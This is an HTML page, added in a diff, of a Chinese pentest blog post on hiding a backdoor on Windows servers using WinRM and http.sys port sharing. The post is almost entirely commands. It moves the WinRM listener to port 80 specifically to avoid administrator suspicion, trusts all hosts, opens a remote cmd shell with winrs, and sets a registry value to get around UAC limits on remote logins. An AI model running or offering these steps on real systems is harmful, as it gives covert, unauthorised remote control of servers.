@@ -1,0 +1,621 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>利用http.sys端口复用实现后门 | 七友 | 路漫漫其修远兮，吾将上下而求索</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="pentest">
+    <meta name="description" content="利用http.sys端口复用实现后门原理这个后门的基本原理是用Windows的远程管理管理服务WinRM配合http.sys端口复用的特性实现正向连接的后门 http.sys简介1HTTP.sys是仅在Windows上运行的ASP.NET Core的web服务器。HTTP.sys是Kestrel服务器的替代品，它提供了Kestrel没有提供的一些功能。 http.sys支持的系统121. Wind">
+<meta name="keywords" content="pentest">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用http.sys端口复用实现后门">
+<meta property="og:url" content="https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/index.html">
+<meta property="og:site_name" content="七友">
+<meta property="og:description" content="利用http.sys端口复用实现后门原理这个后门的基本原理是用Windows的远程管理管理服务WinRM配合http.sys端口复用的特性实现正向连接的后门 http.sys简介1HTTP.sys是仅在Windows上运行的ASP.NET Core的web服务器。HTTP.sys是Kestrel服务器的替代品，它提供了Kestrel没有提供的一些功能。 http.sys支持的系统121. Wind">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122213210-9778fbb4-3d1b-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122215742-289ec85a-3d1f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122220258-e4d3b512-3d1f-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122220929-ce714b1c-3d20-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122221308-50a1d19c-3d21-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122221950-404e6f34-3d22-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122222923-95aa8d90-3d23-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122224651-06c50a12-3d26-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122224859-52946618-3d26-1.png">
+<meta property="og:updated_time" content="2020-01-22T15:38:59.260Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="利用http.sys端口复用实现后门">
+<meta name="twitter:description" content="利用http.sys端口复用实现后门原理这个后门的基本原理是用Windows的远程管理管理服务WinRM配合http.sys端口复用的特性实现正向连接的后门 http.sys简介1HTTP.sys是仅在Windows上运行的ASP.NET Core的web服务器。HTTP.sys是Kestrel服务器的替代品，它提供了Kestrel没有提供的一些功能。 http.sys支持的系统121. Wind">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200122213210-9778fbb4-3d1b-1.png">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname"></h5>
+          <a href="mailto:1920854803@qq.com" title="1920854803@qq.com" class="mail">1920854803@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/byqiyou" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/friends"  >
+                <i class="icon icon-lg icon-friends"></i>
+                Friends
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-about"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">利用http.sys端口复用实现后门</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">利用http.sys端口复用实现后门</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-01-22T15:39:18.000Z" itemprop="datePublished" class="page-time">
+  2020-01-22
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#利用http-sys端口复用实现后门"><span class="post-toc-number">1.</span> <span class="post-toc-text">利用http.sys端口复用实现后门</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#原理"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#http-sys"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">http.sys</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#开启WinRM服务"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">开启WinRM服务</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#添加80端口Listener"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">添加80端口Listener</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#本地连接配置"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">本地连接配置</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#UAC限制"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">UAC限制</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-利用http-sys端口复用实现后门"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">利用http.sys端口复用实现后门</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-01-22 23:39:18" datetime="2020-01-22T15:39:18.000Z"  itemprop="datePublished">2020-01-22</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="利用http-sys端口复用实现后门"><a href="#利用http-sys端口复用实现后门" class="headerlink" title="利用http.sys端口复用实现后门"></a>利用http.sys端口复用实现后门</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>这个后门的基本原理是用<code>Windows</code>的远程管理管理服务<code>WinRM</code>配合<code>http.sys</code>端口复用的特性实现正向连接的后门</p>
+<h2 id="http-sys"><a href="#http-sys" class="headerlink" title="http.sys"></a>http.sys</h2><p>简介<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP.sys是仅在Windows上运行的ASP.NET Core的web服务器。HTTP.sys是Kestrel服务器的替代品，它提供了Kestrel没有提供的一些功能。</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><code>http.sys</code>支持的系统<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. Windows 7 or later</span><br><span class="line">2. Windows Server 2008 R2 or later</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p><code>HTTP.sys</code>支持以下特性：<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Windows Authentication</span><br><span class="line">2. Port sharing</span><br><span class="line">3. HTTPS with SNI</span><br><span class="line">4. HTTP/2 over TLS (Windows 10 or later)</span><br><span class="line">5. Direct file transmission</span><br><span class="line">6. Response caching</span><br><span class="line">7. WebSockets (Windows 8 or later)</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>其中<code>Port sharing</code>就是我们要利用<code>http.sys</code>的特性之一端口复用，所有基于<code>HTTP.sys</code>驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可，使用<code>netsh http show servicestate</code>命令可以查看所有在<code>HTTP.sys</code>上注册过的url前缀。</p>
+<h3 id="开启WinRM服务"><a href="#开启WinRM服务" class="headerlink" title="开启WinRM服务"></a>开启<code>WinRM</code>服务</h3><ol>
+<li><code>Windows Server 2012</code>及以上默认是开启<code>WinRM</code>服务的</li>
+<li><code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的</li>
+</ol>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122213210-9778fbb4-3d1b-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="添加80端口Listener"><a href="#添加80端口Listener" class="headerlink" title="添加80端口Listener"></a>添加80端口Listener</h2><p> <code>Windows 2012</code>及以上就只需要执行一条命令就可以实现：<code>winrm set winrm/config/service @{EnableCompatibilityHttpListener="true"}</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122215742-289ec85a-3d1f-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>查看<code>Listener</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220258-e4d3b512-3d1f-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>还有要注意一点就是：<code>Windows Server 2008 R2</code>是默认不开启<code>WinRM</code>服务的，但是我们启动了之后就会监听<code>5985</code>端口，如图</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122220929-ce714b1c-3d20-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这就会让管理员起疑心，所以我们就要修改一下<code>WinRM</code>的端口，通过下面这条命令把<code>WinRM</code>的端空改为80端口：<br><code>winrm set winrm/config/Listener?Address=*+Transport=HTTP @{Port="80"}</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221308-50a1d19c-3d21-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="本地连接配置"><a href="#本地连接配置" class="headerlink" title="本地连接配置"></a>本地连接配置</h2><p>本地配置执行以下两条命令即可，执行以下两条命令即可。</p>
+<ol>
+<li>开启接<code>WinRM</code>服务：<code>winrm quickconfig -q</code></li>
+<li>设置信任连接的主机：<code>winrm set winrm/config/Client @{TrustedHosts="*"}</code></li>
+</ol>
+<p>然后我们就可以使用<code>winrs</code>命令连接远程<code>WinRM</code>服务执行命令即可<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou whoami</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122221950-404e6f34-3d22-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>返回交互式shell<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.141.148 -u:administrator -p:qiyou cmd</span><br></pre></td></tr></tbody></table></figure><p></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122222923-95aa8d90-3d23-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h2 id="UAC限制"><a href="#UAC限制" class="headerlink" title="UAC限制"></a>UAC限制</h2><p>经过测试<code>Windows Server 2012</code>的<code>WinRM</code>服务受<code>UAC</code>限制，<code>administrators</code>组除了<code>administrator</code>能登陆之外，其它用户是登陆不了的，但是<code>Windows Server 2008</code>不受<code>UAC</code>限制，<code>Windows Server 2012</code>的非<code>administrator</code>用户如果直接登陆就会出现如下情况</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224651-06c50a12-3d26-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>需要修改以下注册表，PS：修改之后不需要重启<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</span><br></pre></td></tr></tbody></table></figure><p></p>
+<p>修改之后就可以成功登陆了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200122224859-52946618-3d26-1.png" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2020-01-22T15:38:59.260Z" itemprop="dateUpdated">2020-01-22 23:38:59</time>
+</span><br>
+
+
+        
+        know it then hack it
+        
+    </div>
+    
+    <footer>
+        <a href="https://byqiyou.github.io">
+            <img src="/img/avatar.jpg" alt="">
+            
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pentest/">pentest</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/&title=《利用http.sys端口复用实现后门》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/&title=《利用http.sys端口复用实现后门》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《利用http.sys端口复用实现后门》 — 七友&url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2020/01/20/GORM学习笔记/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">GORM学习</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'true';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+<section class="comments" id="comments">
+    <!-- UY BEGIN -->
+    <div id="uyan_frame"></div>
+    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
+    <!-- UY END -->
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        Thinks
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span> &copy; 2018 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/&title=《利用http.sys端口复用实现后门》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/&title=《利用http.sys端口复用实现后门》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《利用http.sys端口复用实现后门》 — 七友&url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/&via=https://byqiyou.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2020/01/22/利用http-sys端口复用实现后门/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = 'Leave';
+            clearTimeout(titleTime);
+        } else {
+            document.title = 'Come back';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
